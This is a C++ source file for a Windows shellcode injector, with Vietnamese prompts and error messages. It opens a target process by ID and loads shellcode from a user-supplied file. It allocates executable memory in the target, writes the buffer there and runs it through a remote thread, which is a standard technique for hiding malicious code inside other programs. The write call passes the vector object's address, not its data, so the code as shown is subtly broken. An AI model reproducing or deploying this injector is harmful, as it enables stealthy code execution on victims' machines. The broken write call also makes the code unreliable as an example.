#include <windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#include <TlHelp32.h>

using namespace std;
DWORD PID, TID;
int main(int argc, char* argv[]) {
    if (argc < 2) {
        cout << "Please type a parameter";
        return 0;
    }
    else {
        int PIDi = atoi(argv[1]);
        PID = (DWORD)PIDi;
    }
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, PID);
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    THREADENTRY32 te; te.dwSize = sizeof(te);
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == PID) {
                TID = te.th32ThreadID;
                cout << TID << "\n";
            }
        } while (Thread32Next(hSnap, &te));
        
    }
    string file_name;
    wcout << L"[+] Nhap ten file shellcode: ";
    cin >> file_name;

    ifstream InputBin(file_name, ios::binary | ios::ate);
    if (!InputBin) {
        wcerr << L"[-] Loi: Khong mo duoc file!" << endl;
        return 1;
    }

    streamsize file_size = InputBin.tellg();
    if (file_size <= 0) {
        wcerr << L"[-] Loi: File rong hoac loi khi lay kich thuoc!" << endl;
        return 1;
    }

    InputBin.seekg(0, ios::beg); // Quay l?i ??u file ?? ??c
    vector<unsigned char> cache(file_size);

    if (!InputBin.read((char*)cache.data(), file_size)) {
        wcerr << L"[-] Loi: Doc file that bai!" << endl;
        return 1;
    }
    InputBin.close();

    void* exec = VirtualAllocEx(hProc, NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        wcerr << L"[-] Loi: Cap phat bo nho that bai!" << endl;
        return 1;
    }
    bool write = WriteProcessMemory(hProc, exec, &cache, file_size, NULL);

    /*memcpy(exec, cache.data(), file_size);

    wcout << L"[+] Dang thuc thi shellcode..." << endl;
    ((void(*)())exec)();  // G?i shellcode nh? 1 hàm*/

    HANDLE hRmTheard = CreateRemoteThreadEx(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL, &TID);
    CloseHandle(hRmTheard);
    CloseHandle(hProc);

    return 0;
}
